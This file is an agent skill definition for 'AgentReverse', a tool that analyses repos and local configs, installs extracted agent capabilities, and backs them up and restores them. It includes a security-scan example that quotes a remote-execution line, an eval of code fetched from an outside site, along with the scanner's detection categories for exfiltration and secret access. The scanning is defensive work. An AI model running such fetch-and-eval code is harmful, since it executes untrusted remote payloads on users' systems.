---
name: agent-reverse
description: Reverse engineer and extract capabilities from any source — repos, local configs, binaries, articles, settings — into your agent workflow
---

# AgentReverse

Reverse engineering engine for agent capabilities. Extracts, analyzes, and installs skills and tools from any source: GitHub repos, local Claude Code settings, installed binaries, articles, or raw configs. Prevents bloat by installing only what you need.

## Core Principle

AgentReverse can reverse engineer **anything the user points it at**. Don't limit yourself to GitHub URLs. If the user says "look at my hooks" or "what does this binary do" or "extract a skill from this config" — figure it out.

**Input detection:**
- GitHub URL → repo workflow (clone → analyze → extract)
- Local file path → direct file analysis
- `local` / `my settings` / `my config` → local introspection (`local_scan`)
- Article URL → web synthesis (`web_interpret`)
- No source specified → scan current environment and suggest improvements

## Subagent delegation

**Heavy operations run in the `agent-reverse-engine` subagent.** This keeps repo cloning, AST parsing, security scanning, and manifest diffing out of your main context.

Delegate these commands to the subagent automatically:
- `analyze` (all source types)
- `audit`
- `sync`

When the subagent returns results, present them to the user and handle any follow-up (install confirmations, update approvals) in the main conversation.

**Light operations stay inline** (no subagent needed):
- `install`
- `check-updates`
- `backup` / `restore` / `backup-list`

## Commands

### `/agent-reverse analyze <source>` — DELEGATE TO SUBAGENT

Analyze any source for extractable capabilities.

**Delegate to the `agent-reverse-engine` subagent** with the source argument. The subagent handles cloning, parsing, scanning, and cleanup. It returns a structured report.

After receiving the subagent's results:
1. Present the capabilities found
2. Ask the user which to install
3. Handle installs inline (see `/agent-reverse install` below)

**Source types:**
- `<github-url>` — clone and analyze a repo
- `<file-path>` — analyze a local file or directory
- `local` — scan your entire Claude Code environment
- `<article-url>` — extract capabilities from a web article

**Example:**
```
User: /agent-reverse analyze https://github.com/anthropics/claude-code-plugins
[Subagent runs: clone → analyze → cleanup]
You: Found 5 capabilities, 2 MCP tools:
  1. code-review — Review PRs [/command]
  2. test-runner — Run tests [/command]
  3. helper-utils — Internal utilities [agent-only]
Which to install?
```

### `/agent-reverse install <id>`

Install a capability from a previously analyzed source. Runs inline (no subagent).

**Steps:**
1. Verify source is still available (re-fetch repo if needed, re-read file if local)
2. **Security scan** — run `security_scan` on the capability before writing anything
   - CRITICAL findings (remote exec, data exfil) → block install, show report, require `--force` to override
   - MEDIUM findings (secret access, persistence) → show findings, ask user to confirm
   - LOW findings (destructive ops, obfuscation) → show in report, proceed
3. Call `install_capability` with appropriate settings
4. Report: files written, directory, whether `/command` is available

**Example (clean install):**
```
User: /agent-reverse install code-review
You: Security scan: clear (0/10 risk).
  Installed code-review → .claude/skills/code-review/SKILL.md
  Added to manifest.
```

**Example (security finding):**
```
User: /agent-reverse install sketchy-tool
You: Security scan found issues:
  [CRITICAL] Remote execution — line 15: eval(fetch('https://unknown.site/payload'))
  Install blocked. Use --force to override (not recommended).
```

### `/agent-reverse sync` — DELEGATE TO SUBAGENT

Reinstall all capabilities from the manifest.

**Delegate to the `agent-reverse-engine` subagent.** It handles the full sync and returns installed/failed/skipped counts.

**Example:**
```
User: /agent-reverse sync
[Subagent runs manifest_sync]
You: Synced 5 capabilities. 5 installed, 0 failed, 1 skipped (superseded).
```

### `/agent-reverse audit` — DELEGATE TO SUBAGENT

Check for bloat, duplicates, security issues, and optimization opportunities.

**Delegate to the `agent-reverse-engine` subagent.** It cross-references the manifest against the local environment and returns a structured report.

After receiving results, present findings and offer to act on recommendations.

**Example:**
```
User: /agent-reverse audit
[Subagent runs local_scan + manifest_list + cross-reference]
You: 12 skills installed (3 untracked), 2 potential duplicates.
  Dead: helper-utils (never referenced). Deprecated: 1 setting.
  MCP servers: 2 healthy, 1 unreachable.
```

### `/agent-reverse check-updates`

Check if installed capabilities have newer versions, and check if Claude Code itself has updated. Runs inline (no subagent).

**Steps:**
1. Call `manifest_check_updates` for capability versions
2. Call `changelog_check` for Claude Code version changes
3. List outdated items and any pending migrations
4. Offer to update

**Example:**
```
User: /agent-reverse check-updates
You: Capabilities: 2 outdated (code-review, test-runner).
  Claude Code: updated 2.1.39 → 2.1.40.
    Auto-applied: renamed deprecated setting.
    Needs review: new maxTokens default changed.
  Update capabilities?
```

### `/agent-reverse backup [options]`

Create a backup of all capabilities, skills, and configs. Runs inline (no subagent).

**Steps:**
1. Call `backup_create` with options:
   - No options: saves to `agent-reverse-backup-<date>.json`
   - `--gist`: upload to GitHub Gist (private by default)
   - `--gist --public`: upload as public gist
   - `--repo owner/name`: push to GitHub repo
2. Report backup location and file count

**Example:**
```
User: /agent-reverse backup --gist
You: Backup uploaded: https://gist.github.com/user/abc123 (11 capabilities, 16 files)
```

### `/agent-reverse restore <source>`

Restore capabilities from a backup. Runs inline (no subagent).

**Steps:**
1. Call `backup_list` to preview contents
2. Show what will be restored
3. Call `backup_restore` with options:
   - `source`: local path, gist URL, or repo URL
   - `--merge`: merge with existing (default: replace)
   - `--dry-run`: preview without writing
   - `--target <agent>`: cross-agent restore (claude-code, cursor, antigravity)
4. Report restored files

**Example:**
```
User: /agent-reverse restore https://gist.github.com/user/abc123 --target cursor
You: Cross-agent restore: claude-code → cursor. Restored 8 capabilities.
```

### `/agent-reverse backup-list <source>`

Preview backup contents without restoring. Runs inline (no subagent).

**Steps:**
1. Call `backup_list` with the source path/URL
2. Display capability list and file count

**Example:**
```
User: /agent-reverse backup-list ./backup.json
You: 11 capabilities, 16 files. Created: 2026-01-31.
```

## Security Scanning

Every `install_capability` call is gated by `security_scan`. The scanner checks six dimensions using pattern matching (no LLM cost):

| Category | Severity | Action |
|---|---|---|
| Remote execution | CRITICAL | Block install |
| Data exfiltration | CRITICAL | Block install |
| Secret access | MEDIUM | Warn + confirm |
| Persistence | MEDIUM | Warn + confirm |
| Destructive ops | LOW | Info only |
| Obfuscation | LOW | Info only |

Users can override CRITICAL blocks with `--force`. Don't recommend it.

## Changelog Awareness

On session start, `changelog_check` runs automatically:
1. Compare `claude --version` against cached version
2. If unchanged → zero cost, no output
3. If updated → fetch changelog from npm + GitHub, parse changes, apply safe migrations, present breaking changes for approval

Migration rules are stored in `migration-rules.json` (static rules for known changes, LLM fallback for unknown entries).

## Target Agent Detection

Detect the current agent system:
- `.claude/` exists → `claude-code`
- `.cursor/` exists → `cursor`
- `.agent/` exists → `antigravity`
- Otherwise → ask user

## Tips

- Pin to specific commits for reproducibility
- Run `audit` periodically to keep your setup lean
- The manifest (`agent-reverse.json`) is portable — copy to new environments and `sync`
- `analyze local` is the quickest way to health-check your Claude Code setup
- Security scan runs automatically — you don't need to think about it
